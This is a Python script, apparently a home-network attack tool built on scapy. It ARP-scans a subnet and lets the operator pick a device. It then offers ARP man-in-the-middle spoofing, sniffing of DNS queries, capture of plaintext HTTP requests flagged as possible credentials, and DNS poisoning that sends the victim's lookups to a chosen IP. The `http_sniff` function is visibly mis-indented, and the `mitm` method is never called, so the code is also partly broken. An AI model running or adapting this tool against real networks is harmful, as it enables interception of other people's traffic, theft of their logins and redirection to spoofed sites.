#!/usr/bin/env python3

import argparse
import threading
from colorama import Fore, Style
from time import strftime, localtime
from scapy.all import arp_mitm, sniff, DNS, srp, Ether, ARP, send, IP, UDP, DNSRR
from mac_vendor_lookup import MacLookup, VendorNotFoundError
import os
import platform
import ctypes

# Check platform and privileges
if platform.system() == "Windows":
    if not ctypes.windll.shell32.IsUserAnAdmin():
        print(f"{Fore.RED}This script requires Administrator privileges. Please run as Administrator.{Style.RESET_ALL}")
        exit(1)
elif platform.system() == "Linux":  # [LINUX SUPPORT]
    if os.geteuid() != 0:
        print(f"{Fore.RED}This script requires root privileges. Please run with sudo.{Style.RESET_ALL}")
        exit(1)
else:
    print(f"{Fore.RED}Unsupported OS: {platform.system()}{Style.RESET_ALL}")
    exit(1)


parser = argparse.ArgumentParser(description='Device network sniffer')
parser.add_argument('--network', help='Network to scan (e.g., "192.168.0.0/24")',
                    required=True)
parser.add_argument('--iface', help='Network interface to use', required=True)
parser.add_argument('--routerip', help='IP of your home router ', required=True)
opts = parser.parse_args()

def arp_scan(network, iface):
    """
    Performs ARP ping across the local subnet. Once a device responds, its IP
    and MAC address will be recorded. MAC address lookup will also be performed
    against the pre-defined OUI in https://standards-oui.ieee.org/oui/oui.txt.
    """
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network),
                 timeout=5, iface=iface, verbose=False)  # Disable verbose output for Windows
    print(f'\n{Fore.RED}######## NETWORK DEVICES ########{Style.RESET_ALL}\n')
    for i in ans:
        mac = i.answer[ARP].hwsrc
        ip = i.answer[ARP].psrc
        try:
            vendor = MacLookup().lookup(mac)
        except VendorNotFoundError:
            vendor = 'unrecognized device'
        print(f'{Fore.BLUE}{ip}{Style.RESET_ALL} ({mac}, {vendor})')
    print(f'{Fore.YELLOW}0. Exit{Style.RESET_ALL}')
    return input('\nPick a device IP: ')

class Device:
    def __init__(self, routerip, targetip, iface):
        self.routerip = routerip
        self.targetip = targetip
        self.iface = iface

    def mitm(self):
        while True:
            try:
                arp_mitm(self.routerip, self.targetip, iface=self.iface)
            except OSError:
                print('IP seems down, retrying ..')
                continue

    def capture_dns(self):
        sniff(iface=self.iface, prn=self.dns,
              filter=f'src host {self.targetip} and udp port 53', store=0)

    def dns(self, pkt):
        record = pkt[DNS].qd.qname.decode('utf-8').strip('.')
        time = strftime("%m/%d/%Y %H:%M:%S", localtime())
        print(f'[{Fore.GREEN}{time} | {Fore.BLUE}{self.targetip} -> {Fore.RED}{record}{Style.RESET_ALL}]')

    def arp_sniff(self):
        def arp_pkt_callback(pkt):
            if pkt.haslayer(ARP) and pkt[ARP].op == 1:  # ARP request
                print(f'{Fore.YELLOW}ARP Sniff: {pkt[ARP].psrc} -> {pkt[ARP].pdst}{Style.RESET_ALL}')
        sniff(iface=self.iface, prn=arp_pkt_callback, filter=f'arp and host {self.targetip}', store=0)

    def http_sniff(self):
    def http_pkt_callback(pkt):
        if pkt.haslayer('Raw'):
            raw_data = pkt['Raw'].load.decode('utf-8', errors='ignore')
            lines = raw_data.split('\r\n')
            host = ''
            path = ''
            creds_found = False

            for line in lines:
                if line.startswith("Host:"):
                    host = line.split("Host:")[1].strip()
                if line.startswith("GET") or line.startswith("POST"):
                    path = line.split()[1]
                if any(keyword in line.lower() for keyword in ["username", "user", "email", "password", "passwd", "login"]):
                    creds_found = True

            if host and path and not creds_found:
                print(f'{Fore.CYAN}Visited Page: http://{host}{path}{Style.RESET_ALL}')
            elif creds_found:
                print(f'{Fore.RED}Possible Credentials Detected:{Style.RESET_ALL}\n{Fore.YELLOW}{raw_data}{Style.RESET_ALL}')

    sniff(iface=self.iface, prn=http_pkt_callback, filter=f'tcp port 80 and host {self.targetip}', store=0)


    def dns_poison(self, spoof_ip):
        def dns_pkt_callback(pkt):
            if pkt.haslayer(DNS) and pkt[DNS].qr == 0:  # DNS query
                spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                              UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                              DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                                  an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=spoof_ip))
                send(spoofed_pkt, iface=self.iface, verbose=False)  # Disable verbose output for Windows
                print(f'{Fore.RED}DNS Poison: Redirected {pkt[DNS].qd.qname.decode()} to {spoof_ip}{Style.RESET_ALL}')
        sniff(iface=self.iface, prn=dns_pkt_callback, filter=f'udp port 53 and host {self.targetip}', store=0)

    def sniff(self):
        while True:
            print(f'\n{Fore.GREEN}Select Your Choice:{Style.RESET_ALL}')
            print(f'1. DNS Sniff\n2. HTTP Sniff\n3. DNS Poison\n4. ARP Sniff\n5. Exit')
            try:
                choice = int(input(f'{Fore.BLUE}Your choice: {Style.RESET_ALL}'))
            except ValueError:
                print(f"{Fore.RED}Invalid input! Please enter a number.{Style.RESET_ALL}")
                continue
            if choice == 1:
                self.capture_dns()
            elif choice == 2:
                self.http_sniff()
            elif choice == 3:
                spoof_ip = input(f'{Fore.RED}Enter spoofed IP: {Style.RESET_ALL}')
                self.dns_poison(spoof_ip)
            elif choice == 4:
                self.arp_sniff()
            elif choice == 5:
                print(f'{Fore.YELLOW}Exiting...{Style.RESET_ALL}')
                break
            else:
                print(f'{Fore.RED}Invalid choice, try again.{Style.RESET_ALL}')

if __name__ == '__main__':
    while True:
        targetip = arp_scan(opts.network, opts.iface)
        if targetip == "0":
            print(f'{Fore.YELLOW}Exiting...{Style.RESET_ALL}')
            break
        device = Device(opts.routerip, targetip, opts.iface)
        try:
            device.sniff()
        except KeyboardInterrupt:
            print(f'\n{Fore.CYAN}Returning to menu...{Style.RESET_ALL}')
            continue
